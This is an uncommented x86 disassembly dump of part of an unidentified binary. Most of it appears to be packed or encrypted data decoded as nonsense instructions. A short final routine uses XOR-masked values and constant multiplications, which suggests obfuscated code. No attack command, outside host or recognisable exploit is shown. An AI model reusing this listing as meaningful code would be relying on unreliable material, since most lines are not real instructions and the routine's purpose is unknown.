  420768:	shr    BYTE PTR [edx-0x77869f98],cl
  42076e:	inc    ecx
  42076f:	mov    al,ds:0xfc0fd009
  420774:	xor    ah,dh
  420776:	xchg   DWORD PTR [edx-0x26960ed],edi
  42077c:	pop    ds
  42077d:	outs   dx,BYTE PTR ds:[esi]
  42077e:	and    dh,BYTE PTR [edi+0x315fdee]
  420784:	mov    cl,0x4d
  420786:	or     DWORD PTR [ebx-0x268dab91],edi
  42078c:	pop    ecx
  42078d:	cmp    DWORD PTR [ebp-0x5b],ecx
  420790:	fwait
  420791:	adc    DWORD PTR [ecx+eiz*2+0x765beecd],esp
  420798:	aad    0x6e
  42079a:	(bad)  
  42079b:	fbld   TBYTE PTR [edi-0x57]
  42079e:	fsubr  DWORD PTR [ecx]
  4207a0:	out    dx,eax
  4207a1:	and    bl,bl
  4207a3:	ins    DWORD PTR es:[edi],dx
  4207a4:	mov    ah,0xca
  4207a6:	shr    DWORD PTR [eax-0x62c1fbc4],1
  4207ac:	xlat   BYTE PTR ds:[ebx]
  4207ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207ae:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4207b0:	adc    ah,0x7b
  4207b3:	aas    
  4207b4:	push   cs
  4207b5:	mov    DWORD PTR [esi+0xb0a1427],ebp
  4207bb:	popf   
  4207bc:	aas    
  4207bd:	cmp    DWORD PTR [edi+0x2d5063f7],0xffffff87
  4207c4:	cwde   
  4207c5:	xor    DWORD PTR [esi-0x62],edx
  4207c8:	xchg   edx,esi
  4207ca:	mov    dl,0x2b
  4207cc:	jmp    0x4207dc
  4207ce:	or     DWORD PTR [edi+0x50],edi
  4207d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207d2:	outs   dx,BYTE PTR ds:[esi]
  4207d3:	mov    ds:0x25dbce0f,al
  4207d8:	pop    ss
  4207d9:	mov    dh,0xa5
  4207db:	cld    
  4207dc:	mov    ds:0x2c9da202,al
  4207e1:	enter  0xda00,0x7a
  4207e5:	xchg   edx,eax
  4207e6:	mov    WORD PTR [ebp-0x6b],ss
  4207e9:	ins    BYTE PTR es:[edi],dx
  4207ea:	mov    BYTE PTR [eax+0x27995a5c],dh
  4207f0:	inc    ebx
  4207f1:	mov    esi,DWORD PTR [esi]
  4207f3:	sbb    BYTE PTR [edi+0x3171a2e4],0xbb
  4207fa:	mov    edi,0x796039a5
  4207ff:	ja     0x42078f
  420801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420802:	stos   BYTE PTR es:[edi],al
  420803:	xchg   edx,eax
  420804:	and    al,0x1d
  420806:	daa    
  420807:	mov    ds:0x6b8c7f31,al
  42080c:	or     ecx,DWORD PTR [ebx-0x6061de3d]
  420812:	lock (bad) 
  420814:	xchg   esp,eax
  420815:	and    ebx,esi
  420817:	mov    bh,0x9c
  420819:	push   cs
  42081a:	sahf   
  42081b:	lods   al,BYTE PTR ds:[esi]
  42081c:	xchg   edx,eax
  42081d:	cmp    eax,0xf135f34b
  420822:	push   ebp
  420823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420824:	aas    
  420825:	mov    edx,0x2e21f242
  42082a:	fsub   QWORD PTR [esp+eiz*4]
  42082d:	rcr    BYTE PTR [ebx+edi*1-0x53],0xe0
  420832:	bound  ebx,QWORD PTR [edi-0x39]
  420835:	push   ds
  420836:	outs   dx,BYTE PTR ds:[esi]
  420837:	loopne 0x420835
  420839:	mov    ebp,0xc7861e99
  42083e:	pop    edi
  42083f:	dec    ebx
  420840:	out    dx,eax
  420841:	pop    eax
  420842:	gs mov edx,0xe90fb9c1
  420848:	or     BYTE PTR [ebx+0x7],0xd6
  42084c:	inc    edi
  42084d:	cmp    al,0x50
  42084f:	add    eax,0x496f8f89
  420854:	data16 jle 0x420803
  420857:	inc    eax
  420859:	cs test eax,0xad0506d3
  42085f:	jno    0x4208cd
  420861:	mov    ebp,0xe96f2f34
  420866:	popa   
  420867:	add    esp,ecx
  420869:	add    ah,0x16
  42086c:	arpl   WORD PTR [ecx+0x31562abb],cx
  420872:	nop
  420873:	nop
  420874:	or     edx,DWORD PTR [ebp-0x6a7e4c47]
  42087a:	push   0xffffffff
  42087c:	xor    eax,0xd2d91bf3
  420881:	mov    bl,0xb7
  420883:	adc    DWORD PTR [ebp+eax*4+0x2fac5869],ebp
  42088a:	inc    edi
  42088b:	mov    ds:0xca4f5ca8,al
  420890:	call   0xadb3:0x5b3df0e1
  420897:	mov    al,0x6a
  420899:	rcr    DWORD PTR [edi-0x9],1
  42089c:	lods   al,BYTE PTR ds:[esi]
  42089d:	ret    0xab81
  4208a0:	or     BYTE PTR [ecx-0x7627cc26],bh
  4208a6:	mov    edx,0x1500ba9b
  4208ab:	test   BYTE PTR [ebx-0x58],dl
  4208ae:	call   0x8d61d363
  4208b3:	xor    BYTE PTR [ebp-0x7d1bf1e0],0x3b
  4208ba:	and    DWORD PTR ds:0x4fa3d4f2,ecx
  4208c0:	push   esp
  4208c1:	sti    
  4208c2:	outs   dx,DWORD PTR ds:[esi]
  4208c3:	fstp   TBYTE PTR [ecx-0x6a]
  4208c6:	bound  ebp,QWORD PTR [ebp-0x25]
  4208c9:	pop    edi
  4208ca:	rol    eax,cl
  4208cc:	rol    DWORD PTR [edx-0x6e],cl
  4208cf:	push   0xffffff8f
  4208d1:	cdq    
  4208d2:	lock ins BYTE PTR es:[edi],dx
  4208d4:	or     eax,0x98fd4de3
  4208d9:	mov    esp,0x5ba96887
  4208de:	push   ebx
  4208df:	popf   
  4208e0:	retf   0x9529
  4208e3:	inc    ecx
  4208e4:	xchg   esi,eax
  4208e5:	scas   al,BYTE PTR es:[edi]
  4208e6:	ret    0x9dc3
  4208e9:	ss loop 0x4208e1
  4208ec:	jge    0x4208dd
  4208ee:	pop    ds
  4208ef:	mov    ah,0xd7
  4208f1:	add    DWORD PTR [edi+0x72f209d2],eax
  4208f7:	shr    ah,0x6
  4208fa:	popa   
  4208fb:	outs   dx,BYTE PTR ds:[esi]
  4208fc:	mov    dh,0x35
  4208fe:	imul   ebx,DWORD PTR [esi+0x69ecacbe],0xdf6768b2
  420908:	xor    eax,0xe419034a
  42090d:	sar    BYTE PTR [eax-0x23781c00],cl
  420913:	pop    ebx
  420914:	xor    al,0x93
  420916:	mov    ch,0x3e
  420918:	mov    esi,0x7694fbed
  42091d:	cmp    dl,ah
  42091f:	dec    eax
  420920:	outs   dx,BYTE PTR ds:[esi]
  420921:	pusha  
  420922:	shr    BYTE PTR [ebx],cl
  420924:	rcl    DWORD PTR [ebx],0x48
  420927:	or     al,0x37
  420929:	outs   dx,DWORD PTR ds:[esi]
  42092a:	pusha  
  42092b:	les    ebp,FWORD PTR [esi]
  42092d:	dec    DWORD PTR [edi]
  42092f:	(bad)  
  420930:	nop
  420931:	cli    
  420932:	jbe    0x420945
  420934:	rcl    ecx,cl
  420936:	add    eax,0x7641d898
  42093b:	(bad)  
  42093c:	into   
  42093d:	sub    cl,BYTE PTR [ebp-0xd4dc89b]
  420943:	jg     0x4208c9
  420945:	in     eax,dx
  420946:	ficom  DWORD PTR [edx-0x761e6007]
  42094c:	and    al,al
  42094e:	dec    eax
  42094f:	mov    cl,0xa2
  420951:	outs   dx,BYTE PTR ds:[esi]
  420952:	fdivr  DWORD PTR [edx]
  420954:	leave  
  420955:	pop    ebx
  420956:	sbb    BYTE PTR [esi+0x3ea1b457],0xc6
  42095d:	sahf   
  42095e:	ds cli 
  420960:	jecxz  0x420934
  420962:	push   0x56dc0eff
  420967:	xchg   DWORD PTR [ebp+0x33],ebp
  42096a:	leave  
  42096b:	add    DWORD PTR [ecx+eax*1+0x54],ebx
  42096f:	(bad)  
  420970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420971:	mov    ebx,0x96adb3d
  420976:	pop    edx
  420977:	cmp    bh,dh
  420979:	pop    eax
  42097a:	sub    dh,dh
  42097c:	mov    edx,0xdeb9d58e
  420981:	add    edi,esi
  420983:	mov    eax,ds:0x9bae3dae
  420988:	pop    ecx
  420989:	jge    0x420a08
  42098b:	lds    ecx,FWORD PTR [edx+esi*4-0x52951713]
  420992:	shl    ebp,cl
  420994:	mov    al,0xf3
  420996:	dec    esi
  420997:	xor    bh,cl
  420999:	mov    ?,ecx
  42099b:	hlt    
  42099c:	or     BYTE PTR [esi-0x13c4dfca],dl
  4209a2:	pop    es
  4209a3:	pop    eax
  4209a4:	mov    edx,0x4e7b5c26
  4209a9:	jo     0x4209d3
  4209ab:	xchg   ecx,eax
  4209ac:	adc    eax,0xa51ae8b5
  4209b1:	loop   0x42096f
  4209b3:	popa   
  4209b4:	xlat   BYTE PTR ds:[ebx]
  4209b5:	icebp  
  4209b6:	pop    ebx
  4209b7:	loop   0x420a29
  4209b9:	stos   BYTE PTR es:[edi],al
  4209ba:	cmp    al,0xff
  4209bc:	push   eax
  4209bd:	push   0x3d
  4209bf:	jge    0x420a1d
  4209c1:	push   es
  4209c2:	test   DWORD PTR [esi],eax
  4209c4:	cmp    eax,0x965e9295
  4209c9:	js     0x4209c5
  4209cb:	ins    DWORD PTR es:[edi],dx
  4209cc:	std    
  4209cd:	outs   dx,BYTE PTR ds:[esi]
  4209ce:	sbb    BYTE PTR [edi+0x51],bl
  4209d1:	xchg   esp,eax
  4209d2:	mov    ?,WORD PTR [eax+ebx*2+0x4f1cb41e]
  4209d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209da:	jle    0x4209e6
  4209dc:	add    cl,dh
  4209de:	repz xchg ecx,eax
  4209e0:	retf   
  4209e1:	mov    ah,0x1
  4209e3:	xchg   edi,eax
  4209e4:	xchg   BYTE PTR [esi-0x5b],dl
  4209e7:	add    BYTE PTR [esi-0x10],cl
  4209ea:	pop    esp
  4209eb:	jmp    0x7240:0xc641f859
  4209f2:	outs   dx,DWORD PTR ds:[esi]
  4209f3:	xchg   edi,eax
  4209f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209f5:	fadd   QWORD PTR [edi+0x2dbdf8f6]
  4209fb:	call   0x4c3177d4
  420a00:	xchg   edi,eax
  420a01:	cli    
  420a02:	and    eax,0xa5ce3aa3
  420a07:	and    ebp,eax
  420a09:	push   edi
  420a0a:	cmp    BYTE PTR [eax-0x663aed86],0x82
  420a11:	mov    eax,ds:0xdba53032
  420a16:	test   BYTE PTR [bp+di],0x7c
  420a1a:	cmp    al,0x79
  420a1c:	sbb    dh,BYTE PTR [edi+ebp*2]
  420a1f:	xor    DWORD PTR [ebx-0x38],ebx
  420a22:	pop    es
  420a23:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  420a25:	jmp    0x4209e3
  420a27:	aam    0xcf
  420a29:	fld    TBYTE PTR [edi+0x5fde93ae]
  420a2f:	xchg   ebx,eax
  420a30:	inc    edi
  420a31:	or     al,0xeb
  420a33:	in     eax,0x8b
  420a35:	out    dx,eax
  420a36:	xchg   dh,bh
  420a38:	mov    eax,0xdc9d19ec
  420a3d:	test   DWORD PTR [esi],0x1a60c3e6
  420a43:	adc    eax,0x9c879e1
  420a48:	(bad)  
  420a49:	sar    BYTE PTR [edx],cl
  420a4b:	add    eax,0x7a881703
  420a50:	dec    edx
  420a51:	adc    bl,BYTE PTR [ebx-0x24b541db]
  420a57:	push   cs
  420a58:	xchg   ebx,eax
  420a59:	mul    BYTE PTR [esi-0x4a2d1756]
  420a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a60:	and    al,0x43
  420a62:	int3   
  420a63:	push   ebx
  420a64:	inc    esp
  420a65:	sub    al,0x16
  420a67:	mov    ecx,?
  420a69:	int3   
  420a6a:	out    dx,eax
  420a6b:	loope  0x420a76
  420a6d:	xchg   ecx,eax
  420a6e:	out    0x3a,eax
  420a70:	sbb    BYTE PTR [ebx+0x61],0x8c
  420a74:	(bad)  
  420a75:	mov    WORD PTR [edi-0x5f2df59c],?
  420a7b:	jae    0x420ad2
  420a7d:	or     dl,BYTE PTR [eax]
  420a7f:	push   0x98fe86a
  420a84:	mov    ecx,0xe48211df
  420a89:	adc    al,0x2
  420a8b:	test   DWORD PTR [esi-0x6b],ebp
  420a8e:	loop   0x420a73
  420a90:	mov    dl,0xf9
  420a92:	pop    ss
  420a93:	not    BYTE PTR [edi-0x16]
  420a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a97:	adc    ebp,DWORD PTR [ebx+ecx*8]
  420a9a:	xor    BYTE PTR [edx-0xb375d2c],bh
  420aa0:	and    eax,0x1f72206b
  420aa5:	(bad)  
  420aa6:	ss leave 
  420aa8:	idiv   BYTE PTR [edx+eax*8-0x4f9b82e]
  420aaf:	push   esi
  420ab0:	enter  0xcdb5,0xb6
  420ab4:	(bad)  
  420ab5:	iret   
  420ab6:	out    0xab,eax
  420ab8:	mov    esi,0xd31c9bd7
  420abd:	push   edi
  420abe:	push   ebp
  420abf:	loope  0x420a43
  420ac1:	rcl    DWORD PTR [esi+eax*4],1
  420ac4:	xchg   esi,ecx
  420ac6:	push   0x36
  420ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ac9:	sahf   
  420aca:	adc    ch,BYTE PTR [edi+eiz*4+0x1ba84f2b]
  420ad1:	or     eax,0x41dec6f8
  420ad6:	data16 faddp st(3),st
  420ad9:	mov    ch,0x96
  420adb:	sbb    eax,0x384ea536
  420ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ae1:	adc    BYTE PTR [ecx-0x3cda74b2],bl
  420ae7:	outs   dx,DWORD PTR ds:[esi]
  420ae8:	sar    DWORD PTR [edi],1
  420aea:	push   ecx
  420aeb:	adc    ah,BYTE PTR [esi*8-0x64c1ce4]
  420af2:	loope  0x420aa0
  420af4:	out    dx,al
  420af5:	daa    
  420af6:	sar    DWORD PTR [edx+ebx*4-0x410c859e],0x87
  420afe:	push   ecx
  420aff:	mov    cl,BYTE PTR [eax+0x7ae94392]
  420b05:	cmp    bh,ch
  420b07:	ds pop ebx
  420b09:	inc    edx
  420b0a:	mov    dh,0xe5
  420b0c:	enter  0x927,0x56
  420b10:	pop    edx
  420b11:	mov    al,ds:0xd02ce7bf
  420b16:	and    cl,al
  420b18:	int    0xf2
  420b1a:	ficom  DWORD PTR [edx]
  420b1c:	lods   al,BYTE PTR ds:[esi]
  420b1d:	mov    ebx,0xb380f0b2
  420b22:	jmp    0x420b9d
  420b24:	js     0x420aac
  420b26:	pop    ds
  420b27:	data16 daa 
  420b29:	jbe    0x420aff
  420b2b:	inc    ecx
  420b2c:	jb     0x420b22
  420b2e:	mov    esp,eax
  420b30:	mov    ebx,0x4801e1b0
  420b35:	pop    ecx
  420b36:	cmp    DWORD PTR [ecx],0x179d304c
  420b3c:	mov    ?,ecx
  420b3e:	imul   bp,si,0xfffd
  420b42:	or     DWORD PTR [ebp-0xf388a81],ecx
  420b48:	out    0xbc,al
  420b4a:	rep stos DWORD PTR es:[edi],eax
  420b4c:	mov    WORD PTR [edx+0x7768628f],gs
  420b52:	outs   dx,DWORD PTR ds:[esi]
  420b53:	dec    ebp
  420b54:	dec    esi
  420b55:	rol    DWORD PTR ds:0x9ab07722,cl
  420b5b:	mov    eax,0x77a481
  420b60:	push   esi
  420b61:	push   edx
  420b62:	mov    esp,0x9e60b461
  420b67:	sub    ebx,DWORD PTR [ebp-0x33]
  420b6a:	dec    ebx
  420b6b:	inc    esi
  420b6c:	ret    
  420b6d:	in     al,0xfa
  420b6f:	or     edx,eax
  420b71:	les    edx,FWORD PTR ds:0x6505c2da
  420b77:	or     eax,0x1bbeb5b7
  420b7c:	imul   ebx,DWORD PTR [eax-0xa],0x1c55c805
  420b83:	sbb    eax,0xdba424ac
  420b88:	mov    dl,0x90
  420b8a:	ja     0x420b4f
  420b8c:	imul   ebp,DWORD PTR [ebx-0x20b5fb41],0x7b
  420b93:	lods   al,BYTE PTR ss:[esi]
  420b95:	dec    edi
  420b96:	mov    dl,0x34
  420b98:	jecxz  0x420c16
  420b9a:	dec    ebx
  420b9b:	cwde   
  420b9c:	fistp  QWORD PTR cs:[esi+ebx*1+0xd]
  420ba1:	jne    0x420b37
  420ba3:	dec    esi
  420ba4:	xchg   DWORD PTR ds:0x6accbbcf,edx
  420baa:	ins    BYTE PTR es:[edi],dx
  420bab:	and    ah,ah
  420bad:	mov    al,0x72
  420baf:	mov    bh,0x97
  420bb1:	scas   al,BYTE PTR es:[edi]
  420bb2:	jmp    0x609f:0x68514a80
  420bb9:	jp     0x420b44
  420bbb:	push   es
  420bbc:	addr16 in al,dx
  420bbe:	push   esp
  420bbf:	push   edi
  420bc0:	jge    0x420c06
  420bc2:	(bad)  
  420bc3:	push   esp
  420bc4:	xchg   esp,eax
  420bc5:	in     eax,0x2e
  420bc7:	leave  
  420bc8:	jo     0x420b9b
  420bca:	push   edi
  420bcb:	mov    ecx,0x7c512e7a
  420bd0:	test   DWORD PTR [edx+0xf],ebp
  420bd3:	mov    ebx,0xedcb65d3
  420bd8:	pop    ebx
  420bd9:	xchg   esi,eax
  420bda:	dec    ebp
  420bdb:	sub    DWORD PTR ds:0xb40b012,edi
  420be1:	icebp  
  420be2:	jmp    FWORD PTR [ecx]
  420be4:	mov    ds:0xbd8dc6ab,al
  420be9:	das    
  420bea:	xor    eax,DWORD PTR [ebx-0x21]
  420bed:	sbb    al,BYTE PTR [eax+0x6d7bebba]
  420bf3:	test   DWORD PTR [esi],edi
  420bf5:	je     0x420c3c
  420bf7:	fsub   QWORD PTR [esp+ebx*2]
  420bfa:	arpl   WORD PTR [ecx-0x1ac53f09],si
  420c00:	imul   ebx,esp,0xb36de71a
  420c06:	mov    edx,0x3d2ae130
  420c0b:	mov    DWORD PTR [eax-0x314f5a],ecx
  420c11:	mov    BYTE PTR [ebx+0x5a],al
  420c14:	cmp    dh,dl
  420c16:	inc    esi
  420c17:	mov    dh,BYTE PTR [eax]
  420c19:	idiv   BYTE PTR [esp+eiz*4-0x24]
  420c1d:	jle    0x420bdb
  420c1f:	das    
  420c20:	and    DWORD PTR [eax+0x9],edx
  420c23:	mov    ?,WORD PTR [ebp-0x12]
  420c26:	mov    ebx,0x68da8cd
  420c2b:	push   esi
  420c2c:	jge    0x420c4b
  420c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c2f:	or     eax,DWORD PTR [ecx+0x25332b6a]
  420c35:	or     bh,0x41
  420c38:	mov    al,ds:0xfeccfacd
  420c3e:	xchg   esp,eax
  420c3f:	and    esi,ebx
  420c41:	push   ebx
  420c42:	ret    0x6577
  420c45:	inc    esp
  420c46:	mov    esi,0xb6b6474e
  420c4b:	ja     0x420c02
  420c4d:	pusha  
  420c4e:	pop    esp
  420c4f:	pop    esp
  420c50:	or     ah,ah
  420c52:	adc    ecx,0xffffff99
  420c55:	jbe    0x420cb7
  420c57:	pop    edi
  420c58:	pop    esp
  420c59:	cdq    
  420c5a:	push   es
  420c5b:	jnp    0x420cd5
  420c5d:	pop    edi
  420c5e:	cdq    
  420c5f:	(bad)  
  420c61:	or     BYTE PTR [ebx+0x2bb3a25e],al
  420c67:	in     eax,dx
  420c68:	push   esp
  420c69:	cld    
  420c6a:	mov    DWORD PTR [ebx],edi
  420c6c:	shl    bl,0x68
  420c6f:	push   edx
  420c70:	push   eax
  420c71:	jbe    0x420c64
  420c73:	sbb    ah,BYTE PTR [esi-0x1cea9c32]
  420c79:	stos   DWORD PTR es:[edi],eax
  420c7a:	jb     0x420cc7
  420c7c:	int    0xc1
  420c7e:	es pop edx
  420c80:	aaa    
  420c81:	cwde   
  420c82:	dec    edi
  420c83:	or     al,0x4c
  420c85:	jne    0x420ca7
  420c87:	aad    0x49
  420c89:	add    cl,BYTE PTR [esi-0x50]
  420c8c:	(bad)  
  420c8d:	cmp    eax,0x19cde771
  420c92:	loop   0x420d12
  420c94:	aaa    
  420c95:	call   0x6620:0xc5e43a91
  420c9c:	jnp    0x420c73
  420c9e:	xchg   ecx,eax
  420c9f:	jae    0x420d13
  420ca1:	pushf  
  420ca2:	push   esp
  420ca3:	xor    DWORD PTR [ebp+0x7d],edi
  420ca6:	sbb    dh,BYTE PTR [esp+ebp*2]
  420ca9:	inc    ebp
  420caa:	aas    
  420cab:	mov    ch,bl
  420cad:	inc    ebp
  420cae:	imul   ebp,DWORD PTR [ecx],0xce1bf5e3
  420cb4:	cwde   
  420cb5:	push   cs
  420cb6:	lods   al,BYTE PTR ds:[esi]
  420cb7:	xor    edx,DWORD PTR [eax+0x443165ff]
  420cbd:	and    DWORD PTR [ebx-0xbef7d07],eax
  420cc3:	enter  0x4017,0x74
  420cc7:	mov    ah,BYTE PTR [esi]
  420cc9:	add    DWORD PTR [edi+ecx*4+0x20e77e20],eax
  420cd0:	xlat   BYTE PTR ds:[ebx]
  420cd1:	mov    ah,0x2e
  420cd3:	popa   
  420cd4:	and    ebp,eax
  420cd6:	rcl    esi,0x95
  420cd9:	and    esp,eax
  420cdb:	out    0x20,eax
  420cdd:	lods   eax,DWORD PTR ds:[esi]
  420cde:	aas    
  420cdf:	mov    dl,0x33
  420ce1:	(bad)  
  420ce2:	outs   dx,DWORD PTR ds:[esi]
  420ce3:	lahf   
  420ce4:	data16 loopne 0x420c92
  420ce7:	stos   DWORD PTR es:[edi],eax
  420ce8:	inc    ecx
  420ce9:	das    
  420cea:	fisttp WORD PTR [esi]
  420cec:	sbb    eax,0xf9a507c1
  420cf1:	sbb    al,0x44
  420cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cf4:	sbb    ebp,DWORD PTR [ecx]
  420cf6:	xchg   esi,eax
  420cf7:	aad    0xd7
  420cf9:	adc    DWORD PTR [esi-0x36],edx
  420cfc:	and    eax,0xb236fbfc
  420d01:	push   0xffffff89
  420d03:	jb     0x420d2f
  420d05:	sub    DWORD PTR [edx+0x5b861091],esp
  420d0b:	xor    eax,0xb6c16eb0
  420d10:	stc    
  420d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d12:	cwde   
  420d13:	lahf   
  420d14:	adc    eax,0x89fb3385
  420d19:	cmp    cl,BYTE PTR [ebx-0x2fccf7ab]
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
